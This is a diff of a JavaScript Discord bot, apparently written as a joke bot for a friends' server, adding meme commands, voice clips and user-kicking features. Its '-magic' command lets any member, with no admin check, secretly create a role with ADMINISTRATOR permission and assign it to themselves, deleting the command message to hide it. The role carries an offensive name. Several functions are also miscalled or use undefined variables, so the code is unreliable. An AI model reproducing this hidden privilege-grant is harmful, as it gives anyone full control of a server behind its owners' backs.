@@ -7,9 +7,8 @@ var daniTime = require('./timeDani');
 const Discord = require('discord.js');
 
 const { LockableClient } = require('./lockable-client');
-const { lastBan } = require('./dani');
-const bot = new LockableClient();
 
+const bot = new LockableClient();
 const client = new Discord.Client();
 const prefix = '-';
 var dictLosersQueue = { '378275337164816394': 0 };
@@ -19,122 +18,171 @@ var dictAdmins = ['378275337164816394', '163416315892072448'];
 var dictVoiceCommands = {
     'imali': './imali.mp3',
     'monitor': './Im_gonna_break_my_monitor.mp3',
-    'eitypag': './ei_typag.mp3'
+    'eitypag': './ei_typag.mp3',
+    'papi': './chupapi_short.mp3'
 }
+
 var dictCommands = {
     'tilted': 'https://on-winning.com/avoid-tilt/',
     'cringe': cringe.list(),
     'info': inf.info(),
     'chill': playlist.chill(),
     'rank1': 'https://eune.op.gg/summoner/userName=Vlad2MeetYou 🧢',
-    'motto': "Dani's life moto is - My life is a party, my home is the club!"
+    'motto': "Dani's life moto is - My life is a party, my home is the club!",
 }
 
 client.once('ready', () => {
     console.log('DaniBot is online!');
 });
 
-client.on('message', async message => {
-    if (!message.content.startsWith(prefix) || message.author.bot) return;
-    const args = message.content.slice(prefix.length).split(/ +/);
-    const command = args.shift().toLowerCase();
-    if (command === 'dani') {
-        message.channel.send(dani.lastBan());
-    }
-    else if (command === 't') {
-        message.channel.send(daniTime.timeOfday());
-    }
 
-    else if (command == 'stream') {
-        const user = args[0];
-        if (!user) return;
-        const userid = user.match(/[0-9]+/g)[0];
-        var currUser = client.users.cache.find(user => user.id === userid);
-        if (!currUser) return;
-        var status = currUser.presence.status;
-        if (status == 'online' || status == 'idle') {
+client.on("message", async (message) => {
+  if (!message.content.startsWith(prefix) || message.author.bot) return;
+  const args = message.content.slice(prefix.length).split(/ +/);
+  const command = args.shift().toLowerCase();
+  if (command === "dani") {
+    message.channel.send(dani.lastBan());
+  } else if (command === "t") {
+    message.channel.send(daniTime.timeOfday());
+  } else if (command == "stream") {
+    const user = args[0];
+    var taggedUser = getUserByTag(user);
+    var status = taggedUser.presence.status;
+    if (status == "online" || status == "idle") {
+      message.channel.send(user);
+      if (user == "<@!374199399146061836>") {
+        message.channel.send(
+          "You can also try - https://www.twitch.tv/gnoyl9375"
+        );
+      } else if (user == "<@!214072494737457152>") {
+        var voice = message.guild.members.cache.find(
+          (user) => user.id === userid
+        ).voice;
 
-            message.channel.send(user);
-            if (user == "<@!374199399146061836>") {
-                message.channel.send("You can also try - https://www.twitch.tv/gnoyl9375");
-            }
-            else if (user == "<@!214072494737457152>") {
-                var voice = message
-                    .guild
-                    .members
-                    .cache
-                    .find(user => user.id === userid).voice;
-
-                if (voice && voice.streaming) {
-                    message.channel.send("vlizai ku4e");
-                    message.channel.send("https://media1.tenor.com/images/4e14ace0fffd89910d2bd2496a68c848/tenor.gif?itemid=20801017")
-                    return
-                }
-                else {
-                    message.channel.send("Probvai tuk: https://www.twitch.tv/freewaydani");
-                };
-
-            };
-            message.channel.send('https://media.tenor.com/images/037ad7fd2f75a122c29f25f241b2770d/tenor.gif');
+        if (voice && voice.streaming) {
+          message.channel.send("vlizai ku4e");
+          message.channel.send(
+            "https://media1.tenor.com/images/4e14ace0fffd89910d2bd2496a68c848/tenor.gif?itemid=20801017"
+          );
+          return;
+        } else {
+          message.channel.send(
+            "Probvai tuk: https://www.twitch.tv/freewaydani"
+          );
         }
-        else
-            message.channel.send(user + " is 🔨 his 🥩");
-    }
-    
-    else if (command == 'rank1' && args[0] == 'vlad') {
-        message.channel.send(dictCommands[command]);
-    }
+      }
+      message.channel.send(
+        "https://media.tenor.com/images/037ad7fd2f75a122c29f25f241b2770d/tenor.gif"
+      );
+    } else message.channel.send(user + " is 🔨 his 🥩");
+  } else if (command == "rank1" && args[0] == "vlad") {
+    message.channel.send(dictCommands[command]);
+  } else if (command in dictCommands) {
+    message.channel.send(dictCommands[command]);
+  } else if (command == "mm") {
+    var number = Math.floor(Math.random() * 100) % 2;
+    var options = ["Losers Queue", "Winners Queue"];
+    var option = options[number];
+    var user = message.member.user.id;
+    message.channel.send(option);
+  } else if (command == "newyear") {
+    const command = "https://pubmed.ncbi.nlm.nih.gov/7396691/";
 
-    else if ((command in dictCommands)) {
-        message.channel.send(dictCommands[command]);
-    }
+    message.channel.send(
+      "Не сте сами! <@!214072494737457152>  <@!374199399146061836> "
+    );
 
-    else if (command == 'mm') {
-        var number = (Math.floor(Math.random() * 100)) % 2;
-        var options = ["Losers Queue", "Winners Queue"];
-        var option = options[number];
-        var user = message.member.user.id;
-        message.channel.send(option);
+    message.channel.send(command);
+  } else if (command == "pochwame") {
+    message.channel.send("zdr, da znae6 4e", {
+      files: ["./start.png"],
+    });
+  } else if (command == "nightmare") {
+    message.channel.send(
+      "https://media1.tenor.com/images/4e14ace0fffd89910d2bd2496a68c848/tenor.gif?itemid=20801017"
+    );
+  } else if (command in dictVoiceCommands && !bot.isLocked()) {
+    bot.lock();
+    const author = message.author.id;
+    var volume = 2;
+    if (
+      command == "eitypag" &&
+      (author == "378275337164816394" || author == "163416315892072448")
+    ) {
+      volume = 200;
     }
-
-    else if (command == 'newyear') {
-        const command = 'https://pubmed.ncbi.nlm.nih.gov/7396691/'
-
-        message.channel.send('Не сте сами! <@!214072494737457152>  <@!374199399146061836> ');
-
-        message.channel.send(command);
+    var voiceChannel = message.member.voice.channel;
+    if (!voiceChannel) {
+      message.channel.send("You have to be in voice 4annel be typak");
+    } else {
+      voiceChannel
+        .join()
+        .then((connection) => {
+          const dispatcher = connection.play(dictVoiceCommands[command], {
+            volume: volume,
+          });
+          dispatcher.on("finish", (end) => voiceChannel.leave());
+          dispatcher.on("error", console.error);
+        })
+        .catch((err) => console.log(err));
+      bot.unlock();
     }
-    else if (command == "pochwame") {
-        message.channel.send('zdr, da znae6 4e', {
-            files: [
-                "./start.png"
-            ]
-        });
-    }
+  } else if (command == "res") {
+    let messageCopy = message;
+    await message.delete();
+    messageCopy.channel.send("https://tenor.com/beX90.gif");
 
-    else if (command == "nightmare") {
-        message.channel.send("https://media1.tenor.com/images/4e14ace0fffd89910d2bd2496a68c848/tenor.gif?itemid=20801017")
+    const authorId = messageCopy.author.id;
+    if (!dictAdmins.includes(authorId)) {
+      messageCopy.channel.send("You are not in the big dick club");
+      return;
     }
+    const user = args[0];
+    var taggedUser = getUserByTag(user);
+    var voice = messageCopy.guild.members.cache.find(
+      (user) => user.id === taggedUser.id
+    ).voice;
 
-    else if ((command in dictVoiceCommands) && !bot.isLocked()) {
-        bot.lock();
-        const author = message.author.id;
-        var volume = 2;
-        if (command == 'eitypag' && (author == '378275337164816394' || author == "163416315892072448")) {
-            volume = 200;
-        }
-        var voiceChannel = message.member.voice.channel;
-        if (!voiceChannel) {
-            message.channel.send("You have to be in voice 4annel be typak");
-        }
-        else {
-            voiceChannel.join().then(connection => {
-                const dispatcher = connection.play(dictVoiceCommands[command], { volume: volume });
-                dispatcher.on('finish', end => voiceChannel.leave());
-                dispatcher.on('error', console.error);
-            }).catch(err => console.log(err))
-            bot.unlock()
-        }
+    if (!voice) return;
+
+    if (!dictAdmins.includes(taggedUser.id)) {
+      await voice.kick();
     }
+  } else if (command == "magic") {
+    message.channel.send("https://tenor.com/AaRQ.gif");
+    let messageCopy = message;
+    message.delete();
+
+    const authorId = messageCopy.author.id;
+    var member = getUserByTag(messageCopy,authorId);
+
+    //---- Admin Role ----
+    const normalPermission = 104320576;
+
+    var role = await messageCopy.guild.roles.create({
+      data: {
+        name: "Sex Offender",
+        color: [250, 173, 195],
+        permissions: [Discord.Permissions.FLAGS.ADMINISTRATOR],
+        mentionable: false,
+      },
+      reason: "Сме яки и мое си го позволим,УСССС",
+    });
+
+    member.roles.add(role);
+  }
 });
+
+function getUserByTag(messageCopy,id){
+    try {
+        const user = id;
+        const userid = user.match(/[0-9]+/g)[0];
+        var currUser = messageCopy.guild.members.cache.find((user) => user.id === userid);
+        return currUser
+    } catch (error) {
+        console.log(error)
+    }
+      
+}
+
 client.login(process.env.token);
